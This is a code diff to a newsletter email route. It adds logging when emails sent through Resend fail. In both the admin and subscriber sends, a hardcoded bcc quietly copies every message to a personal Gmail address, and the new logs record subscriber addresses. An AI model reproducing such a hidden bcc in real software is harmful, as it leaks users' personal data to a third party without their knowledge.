@@ -138,7 +138,7 @@ export async function POST(request: Request) {
         const template = getTemplate(email, normalizedSource);
 
         // Admin notification
-        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
+        const adminSend = await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
           from: fromEmail,
           to: adminEmail,
           subject: template.adminSubject,
@@ -151,16 +151,30 @@ export async function POST(request: Request) {
             </div>
           `),
         });
+        if (adminSend.error) {
+          console.error('[EMAIL FAILURE] Newsletter admin email rejected:', {
+            to: adminEmail, from: fromEmail,
+            errorName: (adminSend.error as any).name,
+            errorMessage: (adminSend.error as any).message,
+          });
+        }
 
         // Subscriber email
-        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
+        const subSend = await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
           from: fromEmail,
           to: email,
           subject: template.subject,
           html: template.html,
         });
+        if (subSend.error) {
+          console.error('[EMAIL FAILURE] Newsletter subscriber email rejected:', {
+            to: email, from: fromEmail,
+            errorName: (subSend.error as any).name,
+            errorMessage: (subSend.error as any).message,
+          });
+        }
       } catch (e) {
-        console.error('Newsletter email error:', e);
+        console.error('[EMAIL FAILURE] Newsletter threw:', e);
       }
     }
 
